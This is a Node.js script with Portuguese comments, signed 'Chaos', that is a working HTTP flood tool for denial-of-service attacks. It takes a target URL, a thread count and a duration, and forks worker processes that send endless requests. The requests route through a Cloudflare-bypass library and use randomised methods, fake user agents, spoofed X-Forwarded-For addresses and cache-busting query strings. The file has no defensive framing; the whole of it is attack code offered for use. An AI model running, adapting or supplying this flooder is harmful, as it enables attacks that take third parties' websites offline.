// Define o número máximo de ouvintes do EventEmitter como ilimitado
require('events').EventEmitter.defaultMaxListeners = 0;

// Importa as bibliotecas necessárias
const cloudflare = require("cloudflare-bypasser");
const cf = new cloudflare();
const randomstring = require("randomstring");
const fakeUa = require("fake-useragent");
const cluster = require("cluster");
const colors = require("colors");

// Verifica se o número de argumentos fornecidos é igual a 5
if (process.argv.length !== 5) {
    console.log("BY CHAOS !!!!".inverse);
    console.log("node bypassing.js url thread time".underline.red);
    process.exit();
}

// Função para enviar requisições flood
function flood_req() {
    var char = randomstring.generate({
        length: 10,
        charset: 'abcdefghijklmnopqstuvwxyz0123456789'
    });

    var charr = randomstring.generate({
        length: 7,
        charset: 'abcdefghijklmnopqstuvwxyz0123456789'
    });

    // Gera um endereço IP aleatório
    ipq = function ranip() {
        return Math.round(Math.random() * 256);
    }
    var ip = ipq() + '.' + ipq() + '.' + ipq() + '.' + ipq();

    // Lista de métodos HTTP
    var Array_method = ['HEAD', 'GET', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'DEL'];
    var randommode = Array_method[Math.floor(Math.random() * Array_method.length)];

    // Envia uma requisição usando o Cloudflare Bypasser
    cf.request({
        method: randommode,
        resolveWithFullResponse: true,
        headers: {
            'User-Agent': fakeUa(),
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'Keep-Alive',
            'Keep-Alive': 'timeout=10,max=100',
            'Origin': 'http://' + char + '.com',
            'Referrer': 'http://google.com/' + char,
            'X-Forwarded-For': ip
        },
        url: process.argv[2] + "?" + charr
    });
}

// Função que inicia o ataque flood
function th() {
    setInterval(() => {
        flood_req();
    });
}

// Verifica se o processo é o processo mestre (Master)
if (cluster.isMaster) {
    // Cria threads de acordo com o número fornecido nos argumentos
    for (let i = 0; i < process.argv[3]; i++) {
        cluster.fork();
        console.log(`Thread ${i + 1} Começando Ataque`);
    }

    console.log("Novo Ataque | Método By Chaos <3".rainbow);
} else {
    // Inicia o ataque em cada thread
    th();
}

// Define um temporizador para encerrar o ataque após o tempo especificado
setTimeout(() => {
    console.log("Ataque Encerrado!");
    process.exit();
}, 1000 * process.argv[4]);

// Lida com exceções não capturadas para evitar a interrupção do programa
process.on('uncaughtException', function (err) {
    // console.log(err);
});

// Lida com rejeições não tratadas de Promises para evitar a interrupção do programa
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
